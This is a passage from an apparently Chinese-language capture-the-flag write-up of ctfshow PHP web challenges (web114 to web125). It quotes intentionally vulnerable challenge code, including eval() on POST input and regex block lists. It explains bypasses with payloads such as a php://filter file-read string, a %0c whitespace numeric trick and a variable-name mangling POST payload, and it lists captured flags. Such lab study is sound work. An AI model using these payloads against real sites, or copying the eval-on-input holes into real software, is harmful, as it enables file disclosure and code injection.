<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/compress|root|zip|convert|</span><span style="color:#d7ba7d">\.\.\/</span><span style="color:#d16969">|http|https|data|data|rot13|base64|string/i'</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'file'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"师傅们居然tql都是非预期 哼！"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(! </span><span style="color:#dcdcaa">is_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">} 师傅们居然tql都是非预期 哼！</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">这里将zlib用法给ban了，也不能用glob，因为highlight_file不能对数组进行高亮。但是仔细审查会发现这里将filter给放出来了？？？</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">payload：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">?file=php:</span><span style="color:#6a9955">//filter/resource=flag.php</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">flag:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">cd0470b-b682-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">d83-</span><span style="color:#b5cea8">98</span><span style="color:#d4d4d4">c3-f6628a41f994}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web115	(%0c+不全等和不等的理解)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"0x"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"."</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"e"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"+"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#6a9955">//az</span></span>
<span class="line"><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'num'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)&nbsp;and&nbsp;</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">!==</span><span style="color:#ce9178">'36'</span><span style="color:#dcdcaa">&nbsp;and&nbsp;trim</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)!==</span><span style="color:#ce9178">'36'</span><span style="color:#dcdcaa">&nbsp;and&nbsp;filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#dcdcaa">&nbsp;&nbsp;&nbsp;&nbsp;if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">&nbsp;&nbsp;&nbsp;&nbsp;}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color:#ce9178">"hacker!!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">&nbsp;&nbsp;&nbsp;&nbsp;}</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color:#ce9178">"hacker!!!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">} hacker!!!</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">谷歌浏览器最初看这个并没有az之后的内容，换个浏览器才有下面得if那些，导致我很是疑惑。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">确实老是忘记str_replace到底哪个参数是干嘛的：</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(find,replace,</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">,count)</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//find是要查找的值</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//replace是查找到后替换find的值</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//string是被搜索的字符串</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">//count可选，对替换数进行计数</span></span>
<span class="line"><span style="color:#6a9955">//返回值是带有替换值的字符串或数组</span></span></code></pre></div></div></figure><p>trim 去除首尾空白字符，去除规则：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222154917.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221118183951782"></p><p>这里 %0c（换页）是没有包含在内的，也就是说 %0c 是可以用的。重点就是第四个 filter 函数和第二级的 if 了。</p><p>本地可以截取代码进行多次尝试：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"0x"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"0"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"."</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"e"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"+"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"1"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">'%0c36'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">) and </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">!==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4"> and </span><span style="color:#dcdcaa">trim</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)!==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4"> and </span><span style="color:#dcdcaa">filter</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">)==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"you did it!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker!!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"hacker!!!"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>注意这里的两个看起来很冲突的比较：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">and </span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">!==</span><span style="color:#ce9178">'36'</span><span style="color:#dcdcaa">和if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$num</span><span style="color:#d4d4d4">==</span><span style="color:#ce9178">'36'</span><span style="color:#d4d4d4">)</span></span></code></pre></div></div></figure><p>通过查官方文档，注意！== 是不全等，!= 是不等，在比较时有什么区别呢？</p><blockquote><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或！== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。</p></blockquote><p>所以这里的不全等比对我们的 %0c36 的时候，即使字符串中有数字，也<strong>不会进行类型转换成数字</strong>进行比较，所以会为 true；而进行等于 == 比较时，<strong>会将其转转成数字</strong>，于是也会为 true</p><p>所以就此四层过滤突破得到 flag：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">ctfshow{</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">bda924d-</span><span style="color:#b5cea8">4602</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">470</span><span style="color:#d4d4d4">a-bb48-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">cc7d0d24c67}</span></span></code></pre></div></div></figure><h3 id="web123php变量名理解构造"><a class="markdownIt-Anchor" href="#web123php变量名理解构造"></a> web123	(php 变量名理解构造)</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'argv'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fun'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW'</span><span style="color:#d4d4d4">])&amp;&amp;</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW.COM'</span><span style="color:#d4d4d4">])&amp;&amp;!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fl0g'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|\/|\~|\`|\!|\@|\#|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\-|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|\'|\,|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|\;|\?/"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">)&amp;&amp;</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">&lt;=</span><span style="color:#b5cea8">18</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$c</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">";"</span><span style="color:#d4d4d4">);  </span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$fl0g</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">"flag_give_me"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">             </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">         }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>在 php 中<strong>变量名只有数字字母下划线</strong>，被 get 或者 post 传入的变量名，如果含有</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1.</span><span style="color:#d4d4d4">空格 </span><span style="color:#ce9178">" "</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">2.</span><span style="color:#d4d4d4">加号 </span><span style="color:#ce9178">"+"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#b5cea8">3.</span><span style="color:#d4d4d4">中括号 </span><span style="color:#ce9178">"[ ]"</span></span></code></pre></div></div></figure><p>会被转化为下划线_，所以按理来说我们构造不出 CTF_SHOW.COM 这个变量 (因为含有.)，但 php 中有个特性就是如果传入 [，它被转化为之后，后面的字符就会被保留下来不会被替换，也就是只替换一次，类似于双写绕过那种方法。</p><p>所以，payload：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">post：CTF_SHOW=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">CTF[SHOW</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">COM=</span><span style="color:#b5cea8">2</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">fun=</span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span></span></code></pre></div></div></figure><h3 id="web125变量覆盖highlight_file"><a class="markdownIt-Anchor" href="#web125变量覆盖highlight_file"></a> web125（变量覆盖 /highlight_file）</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># -*- coding: utf-8 -*-</span></span>
<span class="line"><span style="color:#6a9955"># @Author: Firebasky</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_SERVER</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'argv'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fun'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW'</span><span style="color:#d4d4d4">])&amp;&amp;</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'CTF_SHOW.COM'</span><span style="color:#d4d4d4">])&amp;&amp;!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'fl0g'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">"/</span><span style="color:#d7ba7d">\\\\</span><span style="color:#d16969">|\/|\~|\`|\!|\@|\#|\%|</span><span style="color:#d7ba7d">\^</span><span style="color:#d16969">|\</span><span style="color:#d4d4d4">*</span><span style="color:#d16969">|\-|\</span><span style="color:#d4d4d4">+</span><span style="color:#d16969">|\=|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\"</span><span style="color:#d16969">|\'|\,|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">)&amp;&amp;</span><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">&lt;=</span><span style="color:#b5cea8">16</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$c</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">";"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">         </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$fl0g</span><span style="color:#d4d4d4">===</span><span style="color:#ce9178">"flag_give_me"</span><span style="color:#d4d4d4">){</span></span>
<span class="line"><span style="color:#d4d4d4">             </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">         }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
